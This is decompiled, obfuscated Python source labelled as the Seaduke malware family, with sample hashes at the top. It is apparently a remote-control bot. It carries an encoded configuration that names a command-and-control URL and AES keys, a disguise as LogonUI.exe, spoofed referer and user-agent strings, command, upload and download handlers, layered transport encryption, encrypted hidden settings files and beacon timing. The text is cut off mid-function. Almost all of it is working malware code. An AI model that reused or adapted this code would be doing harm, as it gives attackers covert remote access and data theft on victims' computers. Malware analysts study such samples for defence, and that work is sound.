# Decompiled Python source code from the Seaduke malware family.
# SHA256: 3EB86B7B067C296EF53E4857A74E09F12C2B84B666FC130D1F58AEC18BC74B0D
# SHA1: BB71254FBD41855E8E70F05231CE77FEE6F00388
# MD5: A25EC7749B2DE12C2A86167AFA88A4DD
#
# Reference:
#

import base64
base64_b64encode=base64.b64encode
base64_b64decode=base64.b64decode

import random
random_randrange=random.randrange
random_randint=random.randint
random_choice=random.choice

import string
string_ascii_lowercase=string.ascii_lowercase
string_ascii_uppercase=string.ascii_uppercase
string_digits=string.digits
string_ascii_letters=string.ascii_letters

import os
os_popen2=os.popen2
os_getpid=os.getpid
os_mkdir=os.mkdir
os_chdir=os.chdir
os_getcwd=os.getcwd
os_path=os.path
os_open=os.open
os_close=os.close
os_o_excl=os.O_EXCL
os_o_creat=os.O_CREAT
os_remove=os.remove
os_unlink=os.unlink
os_o_rdwr=os.O_RDWR
os_chmod=os.chmod
os_fstat=os.fstat

import json
json_dumps=json.dumps
json_loads=json.loads

import tempfile
tempfile_namedtemporaryfile=tempfile.NamedTemporaryFile
tempfile_gettempdir=tempfile.gettempdir
tempfile_mkstemp=tempfile.mkstemp

import sys
sys_exc_info=sys.exc_info
sys_stderr=sys.stderr
sys_stdout=sys.stdout
sys_argv=sys.argv
sys_getfilesystemencoding=sys.getfilesystemencoding
v_sys_platform=sys.platform
sys_exit=sys.exit
sys_executable=sys.executable

import urllib
urllib_urlretrieve=urllib.urlretrieve

import urllib2
urllib2_request=urllib2.Request
urllib2_httperror=urllib2.HTTPError
urllib2_quote=urllib2.quote
urllib2_urlopen=urllib2.urlopen
urllib2_unquote=urllib2.unquote
urllib2_build_opener=urllib2.build_opener
urllib2_urlerror=urllib2.URLError

import time
time_sleep=time.sleep

import binascii
binascii_crc32=binascii.crc32

import zlib
zlib_decompress=zlib.decompress
zlib_max_wbits=zlib.MAX_WBITS
zlib_compress=zlib.compress
zlib_decompressobj=zlib.decompressobj

import logging
logging_basicconfig=logging.basicConfig
logging_getlogger=logging.getLogger
logging_debug=logging.DEBUG
logging_critical=logging.CRITICAL

import subprocess
subprocess_pipe=subprocess.PIPE
subprocess_popen=subprocess.Popen
subprocess_call=subprocess.call

import shutil
shutil_rmtree=shutil.rmtree
shutil_copyfile=shutil.copyfile

import threading
threading_thread=threading.Thread

import thread
thread_interrupt_main=thread.interrupt_main

import gc
gc_collect=gc.collect

import errno
errno_eacces=errno.EACCES

import itertools
itertools_chain=itertools.chain

import argparse
argparse_argumentparser=argparse.ArgumentParser

import shlex
shlex_split=shlex.split

import struct
struct_pack=struct.pack
struct_unpack=struct.unpack
struct_calcsize=struct.calcsize

import urlparse
urlparse_urlparse=urlparse.urlparse

import getpass
getpass_getuser=getpass.getuser

import re
re_compile=re.compile

import platform as sys_platform
sys_platform_version=sys_platform.version
sys_platform_architecture=sys_platform.architecture
sys_platform_release=sys_platform.release
sys_platform_node=sys_platform.node
sys_platform_platform=sys_platform.platform
sys_platform_processor=sys_platform.processor

from contextlib import contextmanager
from Crypto.Cipher import AES
aes_mode_cbc=AES.MODE_CBC
aes_new=AES.new
aes_mode_cfb=AES.MODE_CFB

from hashlib import sha1
from HTMLParser import HTMLParser

if v_sys_platform=='win32':
	import _winreg
	from _winreg import HKEY_CURRENT_USER as HKCU
	from _winreg import HKEY_LOCAL_MACHINE as HKLM
	import ctypes
	import ctypes.wintypes
	INTERNET_OPEN_TYPE_PRECONFIG=0
	pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzQDey=0x00080000
	INTERNET_FLAG_PRAGMA_NOCACHE=0x00000100
	pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzQDiy=(-2147483648)
	INTERNET_FLAG_NO_CACHE_WRITE=0x04000000
	pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyQei=3
	pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyQeD=0x00800000
	from subprocess import STARTUPINFO
	v_startup_info=STARTUPINFO()
	v_startup_info.dwFlags|=0x00000001
	v_startup_info.wShowWindow=0
	enum_GEN_READ=0x80000000
	enum_GEN_WRITE=0x40000000
	pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyQDi=0x00000004
	pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyeQi=0x00000001
	pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyeQD=0x00000002
	pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyeiQ=0x20000000
	pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyeiD=3
	pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyeDQ=128
	pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyeDi=-1
	pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyiQe=0x00400000
else:
	import fcntl


v_is_logging_enabled=0


class StdKlass():
	def write(self,s):
		pass


if v_is_logging_enabled:
	logging_basicconfig(level=logging_debug)
else:
	logging_basicconfig(level=logging_critical)

v_logger=logging_getlogger('main')

if not v_is_logging_enabled:
	sys_stdout=StdKlass()
	sys_stderr=StdKlass()


v_bot_version=0.1
v_cmd='cmd'
v_upl='upl'
v_dl='dl'
v_srv='srv'
v_tuple_cmd_upl_dl_service=((v_cmd,'cmd'),(v_upl,'upload'),(v_dl,'download',),(v_srv,'service'),)
v_srv_info='srv_info'
v_srv_upd_setts='srv_upd_setts'
v_tuple_service_info_update_settings=((v_srv_info,'Service info'),(v_srv_upd_setts,'Update Settings'))

def id_generator(size=7,chars=string_ascii_uppercase+string_digits):
	return ''.join(random_choice(chars)for _ in range(size))


#
# {
# 	"first_run_delay": 0, 
# 	"keys": {
#			"aes": "KIjbzZ/ZxdE5KD2XosXqIbEdrCxy3mqDSSLWJ7BFk3o=", 
#			"aes_iv": "cleUKIi+mAVSKL27O4J/UQ=="
#		}, 
#		"autoload_settings": {
#			"exe_name": "LogonUI.exe", 
#			"app_name": "LogonUI.exe", 
#			"delete_after": false
#		}, 
#		"host_scripts": ["http://monitor.syn.cn/rss.php"], 
#		"referer": "https://www.facebook.com/", 
#		"user_agent": "SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)", 
#		"key_id": "P4BNZR0", 
#		"enable_autoload": false
#	}
#
bot_settings=json_loads(zlib_decompress(base64_b64decode('eJx1kF1PwjAUhv/K0iuNpiUMg8Fw4QSTAfFrQQ3GNN12Nua2dpyWj0n877ZAvPOqzTnP+77nnD3JCtSG41ryFCrRkoHXufRICa223z0R4F4yDb/i7wVb7NLx1XTUfVf6fRXG4xTvdq1fr0ZRNHub9IP70ldDYvVWxouNUyYVzKdhcVHfvkbTWbf/2Juw+fNwSH4ctjaqUiLlGowpZH7MhB1wKWpw8pnKlZyH1NYOvk3zX8uODwa4yAygbWei0uAylsrupxMsGuPsP8jSmGbAWK1kYRRS3UqaSIZa02bZkE8rQcgADy4HWFt6u93STCQQK1XSRNXMRa41IBc5SOPQqDAQCGQ+9em1dxZYshZYehHgBvDGO+Vqi8UCqcKcnZPjrXmROoenXvCweOm4IkgRV3ab04H+FvoFdgWNdw==')))
bot_settings['bot_id']=id_generator(size=4)+'-'+bot_settings['key_id']

def get_default_settings():
	return bot_settings


class CryptoKlass(object):

	def __init__(self,v_crypto_aes_key,v_crypto_aes_iv,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('b64',True):
			v_crypto_aes_key=base64_b64decode(v_crypto_aes_key)
			v_crypto_aes_iv=base64_b64decode(v_crypto_aes_iv)
		self.__aes_key=v_crypto_aes_key
		self.__aes_iv=v_crypto_aes_iv


	def encrypt(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiQ):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQi=aes_new(self.__aes_key,aes_mode_cfb,self.__aes_iv)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQD=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQi.encrypt(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiQ)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQD


	def decrypt(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQD):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQi=aes_new(self.__aes_key,aes_mode_cfb,self.__aes_iv)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiQ=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQi.decrypt(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyQD)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiQ


	def encode_data(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiD=zlib_compress(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy,9)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiD=self.encrypt(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiD)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiD=base64_b64encode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiD)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiD=urllib2_quote(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiD)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiD


	def decode_data(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDQ=urllib2_unquote(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDQ=base64_b64decode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDQ)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDQ=self.decrypt(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDQ)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDQ=zlib_decompress(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDQ)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDQ


	@staticmethod
	def tr_crypt(data,key):
		x=0
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDi=range(256)
		for i in range(256):
			x=(x+pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDi[i]+ord(key[i%len(key)]))%256
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDi[i],pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDi[x]=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDi[x],pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDi[i]
		x=y=0
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeiQy=[]
		for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeiQD in data:
			x=(x+1)%256
			y=(y+pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDi[x])%256
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDi[x],pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDi[y]=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDi[y],pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDi[x]
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeiQy.append(chr(ord(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeiQD)^pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDi[(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDi[x]+pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyDi[y])%256]))
		return ''.join(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeiQy)


	@staticmethod
	def tr_encrypt(data_in_out,broker_key):
		random_1_255=random_randint(1,255)
		random_1_7=random_randint(1,7)
		random_xored=random_1_7^random_1_255
		random_string=''
		for n in range(random_1_7):
			random_string+=chr(random_randrange(255))
		data_in_out=chr(random_1_255)+chr(random_xored)+random_string+CryptoKlass.tr_crypt(data_in_out,sha1(broker_key+random_string).hexdigest())
		return data_in_out


	@staticmethod
	def tr_decrypt(data,broker_key):
		first_char=data[0]
		len_random_string=ord(data[1])^ord(first_char)
		random_string=data[2:len_random_string+2]
		return CryptoKlass.tr_crypt(data[len_random_string+2:],sha1(broker_key+random_string).hexdigest())


	@classmethod
	def encrypt_file(cls,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDQ,in_filename,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
		out_filename=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('out_filename',None)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDyQ=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('chunksize',64*1024)
		if not out_filename:
			fd,out_filename=tempfile_mkstemp()
		iv=''.join(chr(random_randint(0,0xFF))for i in range(16))
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDyi=aes_new(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDQ,aes_mode_cbc,iv)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDiQ=os_path.getsize(in_filename)
		with open(in_filename,'rb')as infile:
			with open(out_filename,'wb')as pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDiy:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDiy.write(struct_pack('<Q',pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDiQ))
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDiy.write(iv)
				while True:
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQye=infile.read(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDyQ)
					if len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQye)==0:
						break
					elif len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQye)%16!=0:
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQye+=' '*(16-len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQye)%16)
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDiy.write(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDyi.encrypt(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQye))
		return out_filename


	@classmethod
	def decrypt_file(cls,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDQ,in_filename,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQi=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('out_filename',None)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDyQ=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('chunksize',64*1024)
		if not pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQi:
			fd,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQi=tempfile_mkstemp()
		with open(in_filename,'rb')as infile:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQyD=struct_unpack('<Q',infile.read(struct_calcsize('Q')))[0]
			iv=infile.read(16)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQey=aes_new(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDQ,aes_mode_cbc,iv)
			with open(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQi,'wb')as pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDiy:
				while True:
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQye=infile.read(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDyQ)
					if len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQye)==0:
						break
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDiy.write(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQey.decrypt(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQye))
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDiy.truncate(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQyD)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQi


	@staticmethod
	def unpack_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzy):
		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzy=='gzip':
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=zlib_decompress(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy,16+zlib_max_wbits)
		elif pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzy=='deflate':
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=zlib_decompress(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)
			except Exception as e:
				pass
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=zlib_decompressobj(-zlib_max_wbits).decompress(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy


class BotKlass(object):

	def __init__(self):
		self.__settings=self.__load_settings()
		self.save()
		self.__current_host_index=0
		self.__bot_id=self.__settings['bot_id']
		self.__current_dir=self.self_dir
		self.__transports=self.load_transports()
		self.__current_transport_index=0
		self.__tick_count=1
		self.__tick_count_state=0
		self.__broker_key=id_generator()
		self.__is_first_request=True
		if not 'update_interval' in self.__settings:
			self.__settings['update_interval']=[7,18]
		self.__current_update_interval=self.__settings['update_interval']
		self.decode_data_pattern=re_compile('[a-zA-Z0-9-_]?')


	def __load_settings(self):
		settings_file_path=self.settings_file_path
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQeD={}
		if not os_path.exists(settings_file_path):
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQeD=get_default_settings()
		else:
			try:
				with open(settings_file_path,'rb')as settings_file:
					bot_settings=get_default_settings()
					v_crypto_aes_key=bot_settings['keys']['aes']
					v_crypto_aes_iv=bot_settings['keys']['aes_iv']
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDy=CryptoKlass(v_crypto_aes_key,v_crypto_aes_iv)
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDe=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDy.decrypt(settings_file.read())
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQeD=json_loads(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDe)
			except Exception as e:
				pass
				os_remove(settings_file_path)
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQeD=get_default_settings()
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQeD


	def save(self):
		settings_file_path=self.settings_file_path
		with open(settings_file_path,"wb")as settings_file:
			v_crypto_aes_key=bot_settings['keys']['aes']
			v_crypto_aes_iv=bot_settings['keys']['aes_iv']
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDy=CryptoKlass(v_crypto_aes_key,v_crypto_aes_iv)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyQe=json_dumps(self.__settings)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyQe=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDy.encrypt(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyQe)
			settings_file.write(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyQe)
		return self.__settings


	def do_cleanup_dirs(self):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyQD=self.cleanup_dirs
		for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeQ in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyQD:
			try:
				os_chmod(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeQ,0777)
				shutil_rmtree(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeQ)
			except Exception as e:
				pass
			finally:
				self.__settings['cleanup_dirs'].remove(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeQ)
		self.save()


	def delete_settings_file(self):
		try:
			os_remove(self.settings_file_path)
		except:
			pass


	@staticmethod
	def load_transports():
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeD=['urllib2']
		if v_sys_platform=='win32':
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeD.append('wininet')
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeD


	@staticmethod
	def get_key(key_type):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDQ=get_default_settings()['keys'][key_type]
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDQ


	@property
	def settings_file_path(self):
		key_id=get_default_settings()['key_id']
		if v_sys_platform.startswith('win'):
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDe='tmp'+key_id.lower()
		else:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDe='.'+key_id
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQy=tempfile_gettempdir()
		if v_sys_platform.startswith('win'):
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQD=ctypes.windll.shell32.SHGetFolderPathW
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQD.argtypes=[ctypes.wintypes.HWND,ctypes.c_int,ctypes.wintypes.HANDLE,ctypes.wintypes.DWORD,ctypes.wintypes.LPCWSTR]
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyQ=ctypes.wintypes.create_unicode_buffer(ctypes.wintypes.MAX_PATH)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQD(0,0x1C,0,0,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyQ)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyQ.value
		return os_path.join(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQy,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDe)


	@property
	def debug(self):
		return self.__settings['debug']


	@property
	def current_host(self):
		return self.__settings['host_scripts'][self.__current_host_index]


	@property
	def current_transport(self):
		return self.__transports[self.__current_transport_index]


	@property
	def total_transports(self):
		return len(self.__transports)


	@property
	def total_hosts(self):
		return len(self.__settings['host_scripts'])


	@property
	def host_scripts(self):
		return self.__settings['host_scripts']


	@property
	def bot_id(self):
		return self.__bot_id


	@property
	def key_id(self):
		return self.__settings['key_id']


	@property
	def current_dir(self):
		return self.__current_dir


	@current_dir.setter
	def current_dir(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ):
		self.__current_dir=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ


	@property
	def update_interval(self):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyD=self.__settings['update_interval']
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieDQ=(self.__current_update_interval[0]+self.__current_update_interval[1])/2
		if self.tick_count_enabled:
			if self.tick_count>900/pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieDQ and self.__tick_count_state==0:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieDy=[60,120]
				self.__tick_count=1
				self.__tick_count_state=1
				if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieDy[0]>pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyD[0]and pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieDy[1]>pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyD[1]:
					self.__current_update_interval=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieDy
			elif self.tick_count>3600/pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieDQ and self.__tick_count_state==1:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieDy=[1600,2000]
				self.__tick_count=1
				self.__tick_count_state=2
